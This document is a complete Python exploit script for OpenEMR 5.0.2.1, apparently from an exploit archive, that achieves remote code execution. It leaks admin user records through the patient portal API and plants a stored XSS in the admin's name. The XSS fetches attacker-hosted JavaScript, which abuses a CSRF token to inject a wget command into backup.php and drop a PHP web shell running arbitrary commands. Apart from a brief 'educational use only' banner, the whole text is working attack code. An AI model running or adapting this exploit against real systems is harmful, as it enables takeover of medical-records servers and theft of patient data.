# Exploit Title: OpenEMR 5.0.2.1 - Remote Code Execution
# Exploit Author: Hato0, BvThTrd
# Date: 2020-08-07
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://sourceforge.net/projects/openemr/files/OpenEMR%20Current/5.0.2.1/openemr-5.0.2.tar.gz/download
# Version: 5.0.2.1 (without patches)
# Tested on: Ubuntu Server 20.04.1 LTS, OpenEMR Version 5.0.2.1
# References:
# https://blog.sonarsource.com/openemr-5-0-2-1-command-injection-vulnerability?utm_medium=cpc&utm_source=twitter&utm_campaign=openemr&utm_term=security&utm_content=tofu
# https://www.youtube.com/watch?v=H8VWNwWgYJo&feature=emb_logo

#!/usr/bin/python3

WARNING='''


===================================== WARNING =====================================
    Please do not use for illegal purposes. It's for educational use only.
                        Please be on the good side.
===================================================================================


'''

import argparse
import http.server
import socketserver
import requests
from termcolor import colored
import json

OPENEMR_DIR = ""
RHOST = "127.0.0.1"
RPORT = 80
VHOST = ""
LHOST = "127.0.0.1"
LPORT = 4444
WPORT = 8080

def main():
    print(colored(WARNING, "red"))
    arguments()
    cookie1, cookie2 = init_session()
    jsonReceived, id = get_api(cookie1["OpenEMR"], cookie2["PortalOpenEMR"])
    write_payload_js()
    write_wshell()
    send_xss(id,cookie1["OpenEMR"], cookie2["PortalOpenEMR"], jsonReceived)
    if len(VHOST) > 0 :
        print(colored("[+]", "green"),f'Your wshell is available at http://{VHOST}/{OPENEMR_DIR}interface/main/wshell.php?cmd=')
    else:
        print(colored("[+]", "green"),f'Your wshell is available at http://{RHOST}:{RPORT}/{OPENEMR_DIR}interface/main/wshell.php?cmd=')
    web_serv()

def arguments():
    parser = argparse.ArgumentParser(description='This exploit drop a web shell on an OpenEMR v5.0.2.1 CMS. At the end, GET the URL and run a netcat listener on the LHOST:LHPORT. You will be able to do a Remote Code Execution on this server.')
    parser.add_argument("-d", "--directory", dest='directory', nargs='?', help="Root directory OpenEMR CMS")
    parser.add_argument("-rh", "--rhost", dest='rhost', help="Remote server IP", required=True)
    parser.add_argument("-rp", "--rport", dest='rport', nargs='?', help="Remote server PORT", type=int)
    parser.add_argument("-vh", "--vhost", dest='vhost', nargs='?', help="Remote server DOMAIN_NAME")
    parser.add_argument("-lh", "--lhost", dest='lhost', help="Reverse shell IP", required=True)
    parser.add_argument("-lp", "--lport", dest='lport', help="Reverse shell PORT", type=int, required=True)
    parser.add_argument("-wp", "--wport", dest='wport', nargs='?', help="Web Server PORT", type=int)

    args = parser.parse_args()

    if(args.directory != None):
        global OPENEMR_DIR
        OPENEMR_DIR = str(args.directory)
        if OPENEMR_DIR[-1] != "/":
            OPENEMR_DIR += "/"
    if(args.rhost != None):
        global RHOST
        RHOST =  str(args.rhost)
    if(args.rport != None):
        global RPORT
        RPORT = int(args.rport)
    if(args.vhost != None):
        global VHOST
        VHOST =  str(args.vhost)
    if(args.lhost != None):
        global LHOST
        LHOST = str(args.lhost)
    if(args.lport != None):
        global LPORT
        LPORT = int(args.lport)
    if(args.wport != None):
        global WPORT
        WPORT = int(args.wport)

def init_session():
	r = requests.get(f'http://{RHOST}:{RPORT}/{OPENEMR_DIR}interface/login/login.php?site=default', headers={'host': VHOST})

	if (r.status_code != 200):
		print(colored("[-]", "red"),f'An error occured : {r.status_code} ==>\n{r.text}')
		exit(1)
	else:
		print(colored("[+]", "green"),f'Successfully set Session_Regsiter=true with cookie OpenEMR:{r.cookies["OpenEMR"]}')

	cookies = {"OpenEMR" : r.cookies["OpenEMR"]}
	r = requests.get(f'http://{RHOST}:{RPORT}/{OPENEMR_DIR}portal/account/register.php', headers={'host': VHOST}, cookies=cookies)

	if (r.status_code != 200):
		print(colored("[-]", "red"),f'An error occured : {r.status_code} ==>\n{r.text}')
		exit(1)
	else:
		print(colored("[+]", "green"),f'Successfully set Session_Regsiter=true with cookie PortalOpenEMR:{r.cookies["PortalOpenEMR"]}')


	cookies2 = {"PortalOpenEMR": r.cookies["PortalOpenEMR"]}
	return (cookies, cookies2)


def get_api(cookieEMR, cookiePortal):
	cookies = {"OpenEMR" : cookieEMR, "PortalOpenEMR": cookiePortal}

	r = requests.get(f'http://{RHOST}:{RPORT}/{OPENEMR_DIR}portal/patient/api/users/', headers={'host': VHOST}, cookies=cookies)

	parsed_json = (json.loads(r.text))
	for row in parsed_json['rows']:
		if row['authorized'] == str(1):
			print(colored("[+]", "green"),f'Find admin :')
			print(colored('\t[*]', 'yellow'), f'Id = {row["id"]}')
			print(colored('\t[*]', 'yellow'), f'Username = {row["username"]}')
			print(colored('\t[*]', 'yellow'), f'lname = {row["lname"]}')
			print(colored('\t[*]', 'yellow'), f'fname = {row["fname"]}')
			id = row['id']
			json_to_return = row
	if (r.status_code != 200):
		print(colored("[-]", "red"),f'An error occured : {r.status_code} ==>\n{r.text}')
		exit(1)
	else:
		return (json_to_return, id)


def write_payload_js():
    payload = "var xmlHttp = new XMLHttpRequest();\n"
    payload += "var token = window.location.href;\n"
    if len(VHOST) > 0 :
        payload += "var mainUrl = 'http://{0}/{1}interface/main/tabs/main.php?token_main=';\n".format(VHOST, OPENEMR_DIR)
        payload += "var backUrl = 'http://{0}/{1}interface/main/backup.php';\n".format(VHOST,OPENEMR_DIR)
    else:
        payload += "var mainUrl = 'http://{0}:{1}/{2}interface/main/tabs/main.php?token_main=';\n".format(RHOST, RPORT, OPENEMR_DIR)
        payload += "var backUrl = 'http://{0}:{1}/{2}interface/main/backup.php';\n".format(RHOST, RPORT, OPENEMR_DIR)
    payload += "var cookieSet = 'OpenEMR=';\n\n"

    payload += "token = token.split('=')[1];\n\n"

    payload += "xmlHttp.open( 'GET', backUrl, false );\n"
    payload += "xmlHttp.send(null);\n\n"

    payload += "var response = xmlHttp.responseText;\n"
    payload += "var elemHTML = response.split(' ');\n"
    payload += "var csrf = '';\n\n\n"


    payload += "for(var i=0; i < elemHTML.length; i++)\n"
    payload += "{\n"
    payload += "\t    if(elemHTML[i] == 'name=\"csrf_token_form\"')\n"
    payload += "\t    {\n"
    payload += "\t\t        csrf = elemHTML[i+1].split('=')[1].replace(/\"/g,'');\n"
    payload += "\t\t        break;\n"
    payload += "\t    }\n"
    payload += "}\n\n\n"


    payload += "var formData = new FormData();\n\n"

    payload += "formData.append('csrf_token_form', csrf);\n"
    payload += "formData.append('form_sel_lists[]', 'amendment_status');\n"
    payload += "formData.append('form_sel_layouts[]', '`wget http://{0}:{1}/wshell.php -O wshell.php;`');\n".format(LHOST,WPORT)
    payload += "formData.append('form_step', '102');\n"
    payload += "formData.append('form_status', '');\n\n"

    payload += "var request = new XMLHttpRequest();\n"
    payload += "request.open('POST', backUrl);\n"
    payload += "request.send(formData);\n"

    with open('payload.js','w') as fpayload:
        for line in payload:
            fpayload.write(line)
        fpayload.close()
    print(colored("[+]", "green"),f'Payload XSS written')


def write_wshell():
    with open('wshell.php','w') as fwshell:
        fwshell.write("<?php system($_GET['cmd']); ?>\n")
        fwshell.close()
    print(colored("[+]", "green"),f'Wshell written')


def send_xss(id, cookieEMR, cookiePortal, jsonData):
	cookies = {"OpenEMR" : cookieEMR, "PortalOpenEMR": cookiePortal}
	jsonData["lname"] = "<script src='http://{0}:{1}/payload.js'> </script>".format(LHOST,WPORT)
	jsonData["cpoe"] = 1
	jsonData["source"] = 1
	jsonData.pop("id",None)
	data = json.dumps(jsonData, indent = 4)
	r = requests.put(f'http://{RHOST}:{RPORT}/{OPENEMR_DIR}portal/patient/api/user/{id}', headers={'host': VHOST}, cookies=cookies, data=data)
	print(colored("[+]", "green"),f'Stored XSS dropped')


def web_serv():
    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", WPORT), Handler) as httpd:
        print(colored("[+]", "green"),f'HTTP Simple Server running at localhost PORT {WPORT}')
        httpd.serve_forever()


if __name__ == "__main__":
    main()